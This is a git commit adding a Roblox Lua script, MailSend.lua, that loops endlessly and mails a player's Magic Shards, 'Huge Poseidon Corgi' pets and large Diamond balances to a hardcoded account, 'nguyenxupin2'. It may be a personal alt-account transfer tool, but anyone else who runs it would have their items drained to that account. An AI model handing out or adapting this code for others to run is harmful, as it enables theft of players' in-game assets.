b9296001bdecbfa200fafa96e1c00f3b1eb73a8a
TrungB <88281940+TrungB2@users.noreply.github.com>
2024-02-10 18:14:55 +0700

    Create MailSend.lua

---
+++ MailSend.lua
@@ -0,0 +1,59 @@
+while task.wait() do
+        local saveModule = require(game:GetService("ReplicatedStorage").Library.Client.Save)
+        local result = saveModule.Get()
+
+        local ms = result.Inventory.Misc
+        for i, v in pairs(ms) do
+            if v.id == "Magic Shard" then
+                if v._am >= 50 then
+                    local args = {
+                        [1] = "nguyenxupin2",
+                        [2] = "Magic Shard",
+                        [3] = "Misc",
+                        [4] = i,
+                        [5] = v._am or 1
+                    }
+                    game:GetService("ReplicatedStorage").Network:FindFirstChild("Mailbox: Send"):InvokeServer(
+                        unpack(args)
+                    )
+                end
+            end
+        end
+
+        task.wait(2)
+
+        local pet = result.Inventory.Pet
+        for i, v in pairs(pet) do
+            if v.id == "Huge Poseidon Corgi" then
+                local args = {
+                    [1] = "nguyenxupin2",
+                    [2] = "Huge Poseidon Corgi",
+                    [3] = "Pet",
+                    [4] = i,
+                    [5] = v._am or 1
+                }
+                game:GetService("ReplicatedStorage").Network:FindFirstChild("Mailbox: Send"):InvokeServer(unpack(args))
+            end
+        end
+
+        task.wait(2)
+
+        local GetSave = function()
+            return require(game.ReplicatedStorage.Library.Client.Save).Get()
+        end
+        for i, v in pairs(GetSave().Inventory.Currency) do
+            if v.id == "Diamonds" then
+                if v._am >= 1000000 then
+                    local args = {
+                        [1] = "nguyenxupin2",
+                        [2] = v.id,
+                        [3] = "Currency",
+                        [4] = i,
+                        [5] = 1000000 - 10000
+                    }
+                    game:GetService("ReplicatedStorage"):WaitForChild("Network"):WaitForChild("Mailbox: Send"):InvokeServer(unpack(args))
+                end
+            end
+            task.wait(1)
+        end
+    end
